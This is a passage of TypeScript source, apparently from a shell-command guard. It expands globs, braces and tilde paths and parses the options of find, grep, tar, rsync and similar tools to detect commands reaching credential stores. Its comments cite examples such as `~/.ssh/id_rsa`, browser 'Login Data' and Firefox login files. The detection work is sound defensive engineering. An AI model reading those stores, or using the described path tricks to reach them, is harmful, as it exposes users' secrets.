        if (token.selected) checkRawText(token.text, state);
        contexts.add(context);
      }
    };
    // Edge fragments have a different raw boundary from the complete token.
    // They cannot reuse, or mark, that complete token's contextual proof.
    if (first < end && tokens[first]!.start < range.start) partial(tokens[first++]!);
    if (state.sensitive) return;
    const last = end > first && tokens[end - 1]!.end > range.end ? tokens[--end] : undefined;
    for (let position = next(first); position < end; position = next(position)) {
      const token = tokens[position]!;
      state.context.visits.codeTokenUses += 1;
      if (token.selected) checkRawText(token.text, state);
      covered.set(position, next(position + 1));
      if (state.sensitive) return;
    }
    if (last) partial(last);

  };
  scan(range.index.brace, true);
  if (!state.sensitive) scan(range.index.words, false);
}

// The sensitive-table pattern a (possibly glob) path can reach, or null. Wildcard segments are instantiated with every sensitive name they match that exists in that directory (dot names only when the segment starts with `.`, as bash does without `dotglob`) plus one ordinary filler.

// A failed structural expansion is incomplete path evidence.
const SHELL_PATH_SCAN_LIMITS = Object.freeze({ steps: 16_384, chars: 65_536 });
class ShellScanLimitError extends ShellFloorLimitError {}

function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolean, match: (path: string) => string | null, canonical = true, work?: ShellFloorContext): string | null {

  if (!glob || glob === "-") return null;
  const absolute = resolve(cwd ?? "/", glob);
  if (!hasWildcard(absolute)) {
    const path = unescapeGlob(absolute);

    return match(caseFoldForMatch(canonical ? canonicalFloorPath(path, work, true) : foldCanonicalPathSeparators(path)));
  }
  const segments = absolute.split(/[\\/]/);
  // Whatever a wildcard expands to stays below its literal directory prefix:
  // `~/.mozilla/firefox/*/log*ns.json` reads inside `~/.mozilla` however the
  // random profile name or the file name is spelled.
  const firstWild = segments.findIndex(hasWildcard);
  if (firstWild > 0) {
    const prefix = unescapeGlob(segments.slice(0, firstWild).join("/")) || "/";

    const hit = match(caseFoldForMatch(canonical ? canonicalFloorPath(prefix, work, true) : foldCanonicalPathSeparators(prefix)));
    if (hit) return hit;
  }
  let instances: string[][] = [[]];
  for (const segment of segments) {

    const next: string[][] = [];
    const add = (parts: string[]): void => { next.push(parts); };
    for (const prefix of instances) {

      if (!hasWildcard(segment)) { add([...prefix, unescapeGlob(segment)]); continue; }
      if (segment === "**") add(prefix);
      // The shell expands a glob against the directory as it is: a sensitive name is reachable when it exists there (or when `**` may go deeper).
      const pattern = segment === "**" ? /^/ : segmentMatcher(segment);
      const dotAllowed = dotglob || segment.startsWith(".");
      for (const name of sensitiveNames()) {

        if (!pattern.test(name) || (!dotAllowed && name.startsWith("."))) continue;
        if (!canonical || existsSync([...prefix, name].join("/") || "/")) add([...prefix, name]);
      }
      // One ordinary match stands for "any entry": it reaches a sensitive
      // directory's contents (`~/.ssh/*`) and a name-only pattern (`*/id_rsa`).
      if (segment !== "**") add([...prefix, unescapeGlob(segment.replace(/\[[^\]]*\]/g, "a").replace(/[*?]/g, "a"))]);
      if (next.length > GLOB_INSTANCE_LIMIT) {

        throw new ShellScanLimitError("Shell glob expansion limit exceeded");
      }
    }
    instances = next;
  }
  for (const parts of instances) {
    // The ancestor walk charges each filesystem lookup when it occurs.

    const path = parts.join("/") || "/";
    const hit = match(caseFoldForMatch(canonical ? canonicalFloorPath(path, work) : foldCanonicalPathSeparators(path)));
    if (hit) return hit;
  }
  return null;
}

function isNonFileUrlArgument(text: string): boolean {
  const equals = text.indexOf("=");
  // URL user-info and query values are not separate local file bindings.
  return NON_FILE_URL.test(text.replace(/^-[A-Za-z]/, ""))
    || (equals >= 0 && NON_FILE_URL.test(text.slice(equals + 1)));
}

// Paths an argument can name, including attached values and a source before a destination separator.
function argumentCandidates(glob: string): string[] {
  if (isNonFileUrlArgument(glob)) return [];
  const equals = glob.indexOf("=");
  const attachedPath = /^-[A-Za-z](?=[~./\\]|[A-Za-z]:[\\/])/.test(glob) ? glob.slice(2) : undefined;
  if (glob.startsWith("-") && !glob.includes("=") && !glob.includes("@") && attachedPath === undefined) return [];
  const candidates = [glob];
  if (attachedPath !== undefined) candidates.push(attachedPath);
  if (equals >= 0) candidates.push(glob.slice(equals + 1));
  const at = glob.indexOf("@");
  if (at >= 0) candidates.push(glob.slice(at + 1));
  return candidates
    .map((text) => text.replace(/^(?:<|(?:FILE|OPEN|GOPEN):)/i, "").replace(/^file:\/\//i, ""))
    .filter((text) => text.length > 0 && text !== "-" && !/^[a-z][a-z0-9+.-]*:\/\//i.test(text))
    .flatMap((text) => {
      // A drive prefix belongs to the source; its next colon binds a destination. Protocol-only prefixes never prove a source path.
      const separator = text.indexOf(":", /^[a-z]:[\\/]/i.test(text) ? 2 : 0);
      const source = separator > 0 ? text.slice(0, separator) : "";
      return !text.startsWith("-") && separator < text.length - 1 && /[\\/]|^[.~]/.test(source)
        ? [text, source] : [text];
    });
}

// Bash brace expansion (`~/.{ssh,aws}/x`); a range (`{1..9}`) becomes a wildcard.
function expandBraces(text: string): string[] {
  interface Brace { close: number; commas: number[]; range: boolean; dots: number }
  const braces = new Map<number, Brace>();
  const open: { index: number; brace: Brace }[] = [];
  let dots = 0;
  let escaped = false;
  for (let index = 0; index < text.length; index += 1) {
    const char = text[index]!;
    if (char === "." && text[index - 1] === ".") dots += 1;
    if (escaped) { escaped = false; continue; }
    if (char === "\\") { escaped = true; continue; }
    if (char === "{") open.push({ index, brace: { close: -1, commas: [], range: false, dots } });
    else if (char === ",") open.at(-1)?.brace.commas.push(index);
    else if (char === "}") {
      const parent = open.pop();
      if (parent) {
        parent.brace.close = index;
        parent.brace.range = dots > parent.brace.dots;
        braces.set(parent.index, parent.brace);
      }
    }
  }
  interface Span { start: number; end: number }
  interface Expansion { spans: Span[]; pieces: string[] }
  const pending: Expansion[] = [{ spans: [{ start: 0, end: text.length }], pieces: [] }];
  const out: string[] = [];
  while (pending.length > 0) {
    const expansion = pending.pop()!;
    let branched = false;
    while (expansion.spans.length > 0 && !branched) {
      const span = expansion.spans.pop()!;
      let literal = span.start;
      for (let index = span.start; index < span.end; index += 1) {
        if (text[index] === "\\") { index += 1; continue; }
        if (text[index] !== "{") continue;
        const brace = braces.get(index);
        if (!brace || brace.close >= span.end) break;
        if (brace.commas.length === 0) {
          if (brace.range) {
            expansion.pieces.push(text.slice(literal, index), "*");
            index = brace.close;
            literal = index + 1;
          }
          continue;
        }
        expansion.pieces.push(text.slice(literal, index));
        const bounds = [index, ...brace.commas, brace.close];
        for (let option = bounds.length - 2; option >= 0; option -= 1) {
          pending.push({ pieces: [...expansion.pieces], spans: [...expansion.spans,
            { start: brace.close + 1, end: span.end }, { start: bounds[option]! + 1, end: bounds[option + 1]! }] });
        }
        branched = true;
        break;
      }
      if (!branched) expansion.pieces.push(text.slice(literal, span.end));
    }
    if (!branched) {
      out.push(expansion.pieces.join(""));
      if (out.length >= BRACE_EXPANSION_LIMIT) return out;
    }
  }
  return out;
}

// Glob texts for shell text the AST did not lower (`~user/…`, `{a,b}`) or for a code token.
function rawGlobs(raw: string, home: () => string): string[] {

  return expandBraces(rawGlobText(raw, home));
}

function rawGlobText(raw: string, home: () => string): string {
  return raw
    .replace(/["']/g, "")
    .replace(/^~([A-Za-z0-9._-]*)(?=\/|$)/, (_match, user: string) => (user ? `/home/${user}` : escapeGlob(home())))
    .replace(/\$\{HOME\}|\$HOME\b/g, () => escapeGlob(home()))
    .replace(/\$\([^)]*\)|`[^`]*`|\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*/g, DYNAMIC_SEGMENT);
}

// Glob text of a word from the AST, or null when part of it was not lowered.
function wordGlob(word: ShellWord, home: () => string): string | null {
  let text = "";
  for (const part of word.parts) {
    switch (part.kind) {
      case "literal": case "unicode-escaped": text += escapeGlob(part.value); break;
      case "pattern": text += part.value; break;
      case "parameter":
        text += part.name === "HOME" && part.index === undefined ? escapeGlob(home()) : DYNAMIC_SEGMENT;
        break;
      case "parameter-choice": case "substitution": case "arithmetic-data": text += DYNAMIC_SEGMENT; break;
      case "unknown": return null;
    }
  }
  return text;
}

interface ScanState {
  // Every working directory a later command may run in. A `cd`/`pushd` adds its target and never removes one: a failed `cd`, a subshell or a pipeline stage leaves an earlier directory in force, so each one stays a candidate.
  cwds: (string | undefined)[];
  // A directory change whose target is not static: a relative root is unknown.
  cwdUnknown: boolean;
  // Bumped whenever cwds grows, so loops and functions are rescanned.
  cwdVersion: number;
  // A `cd`/`pushd` already ran earlier in the command (OLDPWD and the stack are in cwds).
  dirChanged: boolean;
  // The command reassigns HOME, so `cd` / `cd ~` names an unknown directory.
  homeReassigned: boolean;
  // CDPATH, `cdable_vars` or `autocd` can redirect a relative `cd`.
  cdRedirects: boolean;
  // Ask reason from directory tracking; unlike ordinaryAsk it keeps path checks canonical.
  cdAsk?: string;
  // The directories the shell is in if the statement just scanned succeeded, when that statement was a static directory change. The right side of `&&` runs only after that success, so it sees these instead of every candidate.
  cdSuccess?: (string | undefined)[];
  // The command is a pipeline stage whose output an `xargs` stage turns into arguments.
  feedsXargs: boolean;
  // For an `xargs` pipeline stage, the stages before it, whose output becomes its arguments.
  xargsUpstream?: { commands: readonly ShellCommand[]; start: number; length: number; checked: Map<string, number> };
  // The command only lists names and metadata (`ls`, `du`, `stat`), so a glob whose expansion reaches a protected directory reads no store content.
  metadataListing: boolean;
  // Ask reason for a read the scan cannot bound but the OS floor confines: a metadata listing glob that expands into a protected directory, or a recursive reader fed static, ordinary roots through `xargs`. Like cdAsk it keeps path checks canonical.
  confinedAsk?: string;
  functions: { body: ShellStatement; version: number }[];
  functionRegistryVersion: number;
  functionsByBody: Map<ShellStatement, { body: ShellStatement; version: number }>;
  dotglob: boolean;
  sensitive: string | null;
  network: boolean;
  hidden: boolean;
  sender?: boolean;
  ordinaryAsk?: string;
  analysisLimited?: true;
  match: (path: string) => string | null;
  pathResults: Map<string, string | null>;
  context: ShellFloorContext;
  transfers: WeakMap<ShellStatement, StatementTransfer>;
  nestedSignals: Map<string, { signal: string | null; effects: ScanEffects }>;
  wordSources: WeakMap<ShellWord, WordSources>;
  commandRanges: WeakMap<ShellStatement, CommandRange>;
  codeRanges: WeakMap<ShellWord, WordCodeRange>;
}

function canonicalFloorPath(path: string, context = new ShellFloorContext(), normalized = false): string {
  return context.canonicalize(path, normalized);
}

function createScanState(cwd: string | undefined, dotglob: boolean, command = "", context = new ShellFloorContext()): ScanState {
  const state: ScanState = { cwds: [cwd], cwdUnknown: false, cwdVersion: 0, dirChanged: false,
    homeReassigned: HOME_REASSIGNMENT.test(command),
    cdRedirects: CD_REDIRECTION.test(command) || (process.env.CDPATH ?? "") !== "",
    functions: [], functionRegistryVersion: 0, functionsByBody: new Map(), feedsXargs: false, metadataListing: false, dotglob, sensitive: null, network: false, hidden: false,
    match: (path) => context.matchPath(path), pathResults: new Map(), context, transfers: new WeakMap(), nestedSignals: new Map(), wordSources: new WeakMap(), commandRanges: new WeakMap(), codeRanges: new WeakMap() };
  if (/auto_?cd/i.test(command)) markCwdUnknown(state, "autocd can change directory");
  return state;
}

function lexicalPathHit(glob: string, cwd: string | undefined, state: ScanState, braceExpansion: boolean): string | null {
  const globEvidence = hasWildcard(glob) || (braceExpansion && glob.includes("{"));
  if (globEvidence) {
    const expanded = braceExpansion ? expandBraces(glob) : [glob];
    if (expanded.length >= BRACE_EXPANSION_LIMIT) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
    for (const candidate of expanded) {

      const hit = sensitivePathHit(candidate, cwd, state.dotglob, state.match, false, state.context);
      if (hit) return hit;
    }
    return null;
  }
  // Plain lexical checks are linear in the bounded source text against the fixed path catalogue; they do not perform filesystem or glob expansion.
  const path = resolve(cwd ?? "/", unescapeGlob(glob));
  return state.match(caseFoldForMatch(foldCanonicalPathSeparators(path)));
}

function checkGlob(glob: string, state: ScanState, braceExpansion = false): void {
  for (const candidate of argumentCandidates(glob)) {

    // A relative path names a location under every directory the command may be in.
    for (const cwd of state.cwds) {

      if (state.sensitive) return;
      // Canonical nulls cannot answer the conservative, filesystem-free pass: a glob may reach a sensitive name whose existence was not established.
      const resultKey = `${state.ordinaryAsk ? "lexical" : "canonical"}:${braceExpansion ? "brace" : "literal"}:${cwd ?? ""}\0${candidate}`;
      const cached = state.pathResults.get(resultKey);
      if (cached !== undefined) {
        state.sensitive = cached;
      } else {
        state.sensitive = state.ordinaryAsk ? lexicalPathHit(candidate, cwd, state, braceExpansion)
          : sensitivePathHit(candidate, cwd, state.dotglob, state.match, true, state.context);
        state.pathResults.set(resultKey, state.sensitive);
      }
      if (state.sensitive && state.metadataListing) confineListingGlob(candidate, cwd, state);
    }
  }
}

// Hit reasons that say the glob could not be bounded at all; those stay a floor.
const UNBOUNDED_GLOB = "glob too broad to rule out a sensitive path";

// `ls ~/Library/Application\ Support/*` lists the names in a protected directory without reading a file. When only the expansion reaches the protected entry (its literal prefix does not), the hit becomes an ordinary ask, which the sandboxed lane leaves to the OS floor. A glob whose literal prefix is already protected (`ls ~/.ssh/*`) stays a floor.
function confineListingGlob(candidate: string, cwd: string | undefined, state: ScanState): void {
  if (!hasWildcard(candidate) || state.sensitive === UNBOUNDED_GLOB) return;
  const absolute = isAbsolute(candidate) ? candidate : resolve(cwd ?? "/", candidate);
  const segments = absolute.split(/[\\/]/);
  const firstWild = segments.findIndex(hasWildcard);
  const prefix = unescapeGlob(segments.slice(0, Math.max(firstWild, 0)).join("/")) || "/";
  if (state.match(caseFoldForMatch(canonicalFloorPath(prefix, state.context)))) return;
  state.confinedAsk ??= `listing glob expands into ${state.sensitive}`;
  state.sensitive = null;
}

// Programs that list names and metadata without reading file contents.
const METADATA_LISTERS = new Set(["ls", "gls", "du", "gdu", "stat", "gstat", "tree", "eza", "exa", "lsd"]);

function isMetadataListing(cmd: ShellCommand, state: ScanState): boolean {
  // A listing piped into `xargs` becomes the reader's arguments.
  if (state.feedsXargs || cmd.words.length === 0) return false;
  const argv = commandArgv(cmd);
  const at = Math.min(wrapperCommand(argv).index, argv.length - 1);
  const name = program(argv[at])?.toLowerCase();
  if (name === undefined || !METADATA_LISTERS.has(name)) return false;
  // Some listers also read a file the caller names, and print or quote it: `tree --fromfile f`, `tree --hintro=f`, `du --files0-from=f`, `du -X f`, `lsd --config-file f`. Such a command is a content read, not a listing.
  return !cmd.words.slice(at + 1).some((word) => {
    const head = literalHead(word);
    if (head === "--") return false;
    if (/^--[A-Za-z0-9-]*(?:file|from|intro|outro)/i.test(head)) return true;
    return (name === "du" || name === "gdu") && /^-[A-Za-z]*X/.test(head);
  });
}

// Runs `scan` once per shell home anchor, resolving the anchors only if the scan reads one.
function scanEachHome(scan: (home: () => string) => void): void {
  let homes: string[] | undefined;
  scan(() => (homes ??= expandShellTildePaths("~"))[0]!);
  for (const home of homes?.slice(1) ?? []) scan(() => home);
}

function checkRawText(raw: string, state: ScanState): void {

  scanEachHome((home) => {

    const globs = state.ordinaryAsk ? [rawGlobText(raw, home)] : rawGlobs(raw, home);
    for (const glob of globs) {  checkGlob(glob, state, true); }
  });
}

function checkWord(word: ShellWord, state: ScanState): void {

  for (const part of word.parts) {
    if (part.kind === "substitution") scanStatement(part.body, state);
    else if (part.kind === "parameter-choice") checkWord(part.operand, state);
  }
  if (state.sensitive) return;
  let raw = false;
  scanEachHome((home) => {
    if (raw) return;
    const glob = wordGlob(word, home);
    if (glob === null) { raw = true; checkRawText(ownWordText(word), state); }
    else checkGlob(glob, state);
  });
}

// Nested syntax owns its own inspection. Only the disjoint outer slices are
// token-scanned here; no grammar is inferred from the resulting text.
const ownWordTexts = new WeakMap<ShellWord, string>();
function ownWordText(word: ShellWord): string {
  const cached = ownWordTexts.get(word);
  if (cached !== undefined) return cached;
  const children = word.parts.flatMap((part) => part.kind === "substitution" ? [part.body.source]
    : part.kind === "parameter-choice" ? [part.operand.source] : []);
  let end = word.source.start;
  const text: string[] = [];
  for (const child of children) {
    if (child.start < end || child.end > word.source.end) continue;
    text.push(word.source.raw.slice(end - word.source.start, child.start - word.source.start), DYNAMIC_SEGMENT);
    end = child.end;
  }
  text.push(word.source.raw.slice(end - word.source.start));
  const own = text.join("");
  ownWordTexts.set(word, own);
  return own;
}

// Path-like tokens inside code the matcher cannot parse (`open("/home/u/.ssh/id_rsa")`).
function scanCodeText(text: string, state: ScanState): void {

  if (state.sensitive) return;
  const names = new Set(sensitiveNames());
  // Preserve brace-shaped path operands when no syntax tree is available.
  if (text.includes("{")) {
    for (const token of text.split(/[\s'"`;|&()<>=:+]+/)) {
      if (token.includes("{") && token.includes("/")) checkRawText(token, state);
      if (state.sensitive) return;
    }
  }
  for (const token of text.split(/[\s'"`;|&()<>,{}[\]=:+]+/)) {
    if (!token || !(token.includes("/") || /^[.~$]/.test(token) || names.has(token))) continue;
    checkRawText(token, state);
    if (state.sensitive) return;
  }
}

// The sensitive-table pattern one path-like argument reaches, or null — for a quoted argument of non-bash code whose path holds spaces (`"…\User Data\Default\Login Data"`), which the token scan would split.
export function sensitivePathInArgumentText(text: string, cwd: string | undefined, work = new ShellFloorContext()): string | null {
  if (shellFloorInputExceeded(text)) return SHELL_FLOOR_BUDGET_REASON;
  try {
    const state = createScanState(cwd, false, "", work);
    checkRawText(text, state);
    return state.sensitive;
  } catch (error) {
    if (error instanceof ShellFloorLimitError) return SHELL_FLOOR_BUDGET_REASON;
    throw error;
  }
}

function commandArgv(cmd: ShellCommand): (string | undefined)[] {
  return cmd.words.map((word) => staticShellWord(word));
}

// Code-text scanning is independent of whether raw argv can match a rule.
function needsCodeTextScan(cmd: ShellCommand): boolean {
  if (cmd.assignments.some((assignment) => codeCarryingVariable(assignment.name))) return true;
  if (arithmeticEvaluationReason(cmd)) return true;
  if (cmd.words.length === 0) return false;
  const argv = commandArgv(cmd);
  return argv[0] === undefined || hiddenCodeReason(argv) !== null || opaqueRunnerReason(argv) !== null;
}

// Covered source-index ranges are skipped before their commands are consumed.
// The successor links compress already-covered spans for each path context.
function scanRangeCode(range: CommandRange, state: ScanState): void {
  const key = JSON.stringify([state.cwds, state.cwdUnknown, state.metadataListing, state.dotglob,
    state.ordinaryAsk !== undefined, state.sensitive]);
  let covered = range.inventory.codeCoverage.get(key);
  if (covered === undefined) { covered = new Map(); range.inventory.codeCoverage.set(key, covered); }
  const next = (from: number): number => {
    let index = from;
    const path: number[] = [];
    while (covered!.has(index)) {
      state.context.visits.coverage += 1;
      path.push(index);
      index = covered!.get(index)!;
    }
    for (const previous of path) covered!.set(previous, index);
    return index;
  };
  for (let index = next(range.start); index < range.end; index = next(index)) {
    scanCodeOf(range.inventory.commands[index]!, state);
    covered.set(index, next(index + 1));
  }
}

function scanCodeOf(cmd: ShellCommand, state: ScanState): void {
  state.context.visits.code += 1;
  for (const word of cmd.words) scanWordCodeText(word, state);
  for (const redirect of cmd.redirects) {
    if (redirect.data && !isShellFloorLiteralData(redirect.data)) {
      const text = staticShellWord(redirect.data);
      if (text === undefined) scanWordSourceCode(redirect.data, state);
      else scanCodeText(text, state);
    }
  }
}

// A parsed plain word already receives its complete path check. Only a word
// containing code/text boundaries can expose additional embedded path tokens.
function scanWordCodeText(word: ShellWord, state: ScanState): void {
  if (isShellFloorLiteralData(word)) return;
  const text = staticShellWord(word);
  if (text === undefined) scanWordSourceCode(word, state);
  else if (/[\s'"`;|&()<>{}\[\]=:+]/.test(text)) scanCodeText(text, state);
}

function scanRedirectTarget(target: ShellWord, state: ScanState): void {
  if (NETWORK_DEVICE.test(target.source.raw)) state.network = true;
  checkWord(target, state);
}

// Entries a symlink-following search may inspect before it is refused as too large to rule out.
const SYMLINK_SCAN_ENTRY_LIMIT = 5000;

// What a search walks: whether it recurses, which symlinks it follows (`all` below the roots, or only `roots` named on the command line), and the indexes of its root words. `find` only lists names, so it is not a content search (`ancestorFloor: false`); only the links it follows matter — unless it hands every file to a program (`-exec cat {}`) or to `xargs`. Archivers and copy tools (`tar c`, `zip -r`, `cp -r`, `rsync -a`, `scp -r`) read every file below their sources, like a content search. `defaultRoot` is whether no root means `.`.
interface SearchShape {
  recursive: boolean;
  follow: "all" | "roots" | false;
  ancestorFloor: boolean;
  roots: number[];
  defaultRoot: boolean;
  // A root list the command reads from a file (`tar -T list`).
  dynamicRoots?: true;
}

type Argv = readonly (string | undefined)[];

// Operand indexes and option names of a getopt-style command line.
function parseOptions(argv: Argv, shortValues: string, longValues: readonly string[]): { operands: number[]; short: Set<string>; long: Set<string> } {
  const operands: number[] = [];
  const short = new Set<string>();
  const long = new Set<string>();
  for (let index = 1; index < argv.length; index += 1) {
    const word = argv[index];
    if (word === undefined || word === "-" || !word.startsWith("-")) { operands.push(index); continue; }
    if (word === "--") { for (let rest = index + 1; rest < argv.length; rest += 1) operands.push(rest); break; }
    if (word.startsWith("--")) {
      const [name = "", value] = word.slice(2).split("=");
      long.add(name);
      if (value === undefined && longValues.includes(name)) index += 1;
      continue;
    }
    for (let at = 1; at < word.length; at += 1) {
      short.add(word[at]!);
      if (shortValues.includes(word[at]!)) { if (at === word.length - 1) index += 1; break; }
    }
  }
  return { operands, short, long };
}

function isRemoteOperand(text: string | undefined): boolean {
  return text !== undefined && !/^[./~]/.test(text) && /^[^/]*:/.test(text);
}

function archiveShape(argv: Argv): SearchShape | null {
  const bsd = process.platform === "darwin";
  // `tar czf out.tgz.`: a leading bundle without a dash, its values in order.
  const bundle = argv[1] !== undefined && /^[A-Za-z]+$/.test(argv[1]) ? argv[1] : undefined;
  const values = bsd ? "fCTXbIs" : "fCTXbKNgIHLV";
  let rest: Argv = argv;
  const bundleShort = new Set<string>();
  if (bundle !== undefined) {
    let consumed = 0;
    for (const letter of bundle) { bundleShort.add(letter); if (values.includes(letter)) consumed += 1; }
    rest = [argv[0], ...argv.slice(2 + consumed)];
  }
  const parsed = parseOptions(rest, values, ["file", "directory", "files-from", "exclude-from", "blocking-factor", "format", "use-compress-program", "exclude"]);
  const short = new Set([...bundleShort, ...parsed.short]);
  const offset = bundle === undefined ? 0 : argv.length - rest.length;
  if (!["c", "r", "u"].some((letter) => short.has(letter)) && !["create", "append", "update"].some((name) => parsed.long.has(name))) return null;
  const follow: SearchShape["follow"] = short.has("h") || parsed.long.has("dereference") || (bsd && short.has("L")) ? "all" : bsd && short.has("H") ? "roots" : false;
  return {
    recursive: true, follow, ancestorFloor: true, defaultRoot: false,
    roots: parsed.operands.map((index) => index + offset),
    ...(short.has("T") || parsed.long.has("files-from") ? { dynamicRoots: true as const } : {}),
  };
}

function copyShape(argv: Argv, name: string): SearchShape | null {
  if (name === "zip") {
    const parsed = parseOptions(argv, "bnstxiPOZ", []);
    if (!parsed.short.has("r") && !parsed.short.has("R") && !parsed.long.has("recurse-paths") && !parsed.long.has("recurse-patterns")) return null;
    // zip stores a link's target unless -y.
    const follow = parsed.short.has("y") || parsed.long.has("symlinks") ? false : "all";
    return { recursive: true, follow, ancestorFloor: true, defaultRoot: false, roots: parsed.operands.slice(1) };
  }
  if (name === "cp" || name === "gcp") {
    const parsed = parseOptions(argv, "tS", ["target-directory", "suffix"]);
    if (!["r", "R", "a"].some((letter) => parsed.short.has(letter)) && !parsed.long.has("recursive") && !parsed.long.has("archive")) return null;
    const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") ? "roots" : false;
    const target = parsed.short.has("t") || [...parsed.long].some((option) => option === "target-directory");
    return { recursive: true, follow, ancestorFloor: true, defaultRoot: false, roots: target ? parsed.operands : parsed.operands.slice(0, -1) };
  }
  if (name === "rsync") {
    const parsed = parseOptions(argv, "efTBM", ["rsh", "filter", "exclude", "include", "files-from", "temp-dir", "rsync-path", "log-file", "partial-dir", "exclude-from", "include-from", "password-file", "compare-dest", "copy-dest", "link-dest"]);
    if (!parsed.short.has("r") && !parsed.short.has("a") && !parsed.long.has("recursive") && !parsed.long.has("archive")) return null;
    const follow = parsed.short.has("L") || parsed.short.has("k") || parsed.long.has("copy-links") || parsed.long.has("copy-unsafe-links") || parsed.long.has("copy-dirlinks") ? "all" : false;
    return {
      recursive: true, follow, ancestorFloor: true, defaultRoot: false,
      roots: parsed.operands.slice(0, -1).filter((index) => !isRemoteOperand(argv[index])),
      ...(parsed.long.has("files-from") ? { dynamicRoots: true as const } : {}),
    };
  }
  if (name === "scp") {
    const parsed = parseOptions(argv, "cFiJloPSD", []);
    if (!parsed.short.has("r")) return null;
    return { recursive: true, follow: "all", ancestorFloor: true, defaultRoot: false, roots: parsed.operands.slice(0, -1).filter((index) => !isRemoteOperand(argv[index])) };
  }
  return null;
}

// `fd`: a name listing, unless it runs a program on every match or feeds `xargs`.
function fdShape(argv: Argv, feedsXargs: boolean): SearchShape {
  const values = "etEdcjSoghp";
  const longValues = ["extension", "type", "exclude", "max-depth", "min-depth", "exact-depth", "color", "threads", "size", "changed-within", "changed-before", "owner", "base-directory", "search-path", "ignore-file", "max-results", "path-separator", "and"];
  const exec = argv.findIndex((word) => word === "-x" || word === "--exec" || word === "-X" || word === "--exec-batch");
  const parsed = parseOptions(exec < 0 ? argv : argv.slice(0, exec), values, longValues);
  const searchPaths = argv.flatMap((word, index) => word === "--search-path" ? [index + 1] : []);
  const follow = parsed.short.has("L") || parsed.long.has("follow") ? "all" : false;
  return { recursive: true, follow, ancestorFloor: exec >= 0 || feedsXargs, defaultRoot: true, roots: [...parsed.operands.slice(1), ...searchPaths] };
}

// `ls` lists names; fed to `xargs` its entries (all of them with `-R`) become reads.
function lsShape(argv: Argv): SearchShape {
  const parsed = parseOptions(argv, "ITw", ["color", "format", "sort", "time", "width", "tabsize", "hide", "ignore", "block-size", "indicator-style", "quoting-style", "time-style"]);
  const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") ? "roots" : false;
  return { recursive: true, follow, ancestorFloor: true, defaultRoot: true, roots: parsed.operands };
}

// `du -a` lists names like `find`; fed to `xargs` its paths become reads.
function duShape(argv: Argv, feedsXargs: boolean): SearchShape {
  const parsed = parseOptions(argv, "BdtX", ["block-size", "max-depth", "threshold", "exclude", "exclude-from", "time-style"]);
  const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") || parsed.short.has("D") ? "roots" : false;
  const all = parsed.short.has("a") || parsed.long.has("all");
  return { recursive: true, follow, ancestorFloor: feedsXargs && all, defaultRoot: true, roots: parsed.operands };
}

function findShape(argv: readonly (string | undefined)[], feedsXargs = false): SearchShape {
  let index = 1;
  let follow: SearchShape["follow"] = false;
  const roots: number[] = [];
  // Leading options: GNU `-H`/`-L`/`-P`, `-D <flags>`, `-O<level>`; BSD also `-E`, `-X`, `-d`, `-s`, `-x` and `-f <path>` (that path is a root).
  while (index < argv.length && argv[index] !== undefined) {
    const word = argv[index]!;
    if (word === "-f") { roots.push(index + 1); index += 2; continue; }
    if (word === "-D") { index += 2; continue; }
    if (!/^-(?:[HLPEXdsx]+|O\d*)$/.test(word)) break;
    // The last of `-H`/`-L`/`-P` wins.
    for (const letter of word.slice(1)) {
      if (letter === "L") follow = "all";
      else if (letter === "H") follow = "roots";
      else if (letter === "P") follow = false;
    }
    index += 1;
  }
  while (index < argv.length && !(argv[index] !== undefined && /^[-(!,]/.test(argv[index]!))) roots.push(index++);
  if (argv.slice(index).some((word) => word === undefined || word === "-follow")) follow = "all";
  // `-exec cat {} ;` and an `xargs` stage read every file found.
  const reads = feedsXargs || argv.slice(index).some((word) => word === undefined || word === "-exec" || word === "-execdir" || word === "-ok" || word === "-okdir");
  return { recursive: true, follow, ancestorFloor: reads, defaultRoot: true, roots: roots.filter((root) => root < argv.length) };
}

// `grep`/`rg`. GNU grep follows links under `-R`/`--dereference-recursive`; BSD grep (macOS `/usr/bin/grep`) recurses with `-r` or `-R` and follows links only with `-S` (its default is `-p`). `ggrep` is GNU everywhere.
function contentSearchShape(argv: readonly (string | undefined)[], name: string): SearchShape {
  const grep = name !== "rg";
  const bsd = grep && name !== "ggrep" && process.platform === "darwin";
  let recursive = !grep;
  let follow: SearchShape["follow"] = false;
  let patternGiven = false;
  const operands: number[] = [];
  let delimited = false;
  for (let index = 1; index < argv.length; index += 1) {
    const word = argv[index];
    if (word === undefined) { operands.push(index); continue; }
    if (!delimited && word === "--") { delimited = true; continue; }
    if (delimited || !word.startsWith("-") || word === "-") { operands.push(index); continue; }
    if (word.startsWith("--")) {
      const [option = "", value] = word.slice(2).toLowerCase().split("=");
      if (option === "regexp" || option === "file") patternGiven = true;
      if (grep && option === "directories") {
        // `--directories=recurse` or `--directories recurse`.
        const directories = value ?? argv[index + 1];
        if (directories === undefined || directories === "recurse") recursive = true;
        if (value === undefined) index += 1;
      }
      if (grep && (option === "recursive" || option === "dereference-recursive")) recursive = true;
      if ((grep && option === "dereference-recursive") || (!grep && option === "follow")) follow = "all";
      continue;
    }
    const cluster = word.slice(1);
    if (/[ef]/.test(cluster)) patternGiven = true;
    if (grep && /[rR]/.test(cluster)) recursive = true;
    if (grep && cluster === "d") {
      if (argv[index + 1] === undefined || argv[index + 1] === "recurse") recursive = true;
      index += 1;
      continue;
    }
    if (grep ? (bsd ? cluster.includes("S") : cluster.includes("R")) : cluster.includes("L")) follow = "all";
  }
  // Every operand but the pattern is a root; an option value counted as a root only widens the check.
  return { recursive, follow, ancestorFloor: true, defaultRoot: true, roots: patternGiven ? operands : operands.slice(1) };
}

function searchShape(argv: readonly (string | undefined)[], feedsXargs = false): SearchShape | null {
  const name = program(argv[0])?.toLowerCase();
  if (name === undefined) return null;
  if (name === "find" || name === "gfind") return findShape(argv, feedsXargs);
  if (name === "grep" || name === "egrep" || name === "fgrep" || name === "ggrep" || name === "rg") return contentSearchShape(argv, name);
  if (name === "tar" || name === "gtar" || name === "bsdtar") return archiveShape(argv);
  if (name === "zip" || name === "cp" || name === "gcp" || name === "rsync" || name === "scp") return copyShape(argv, name);
  if (name === "fd" || name === "fdfind") return fdShape(argv, feedsXargs);
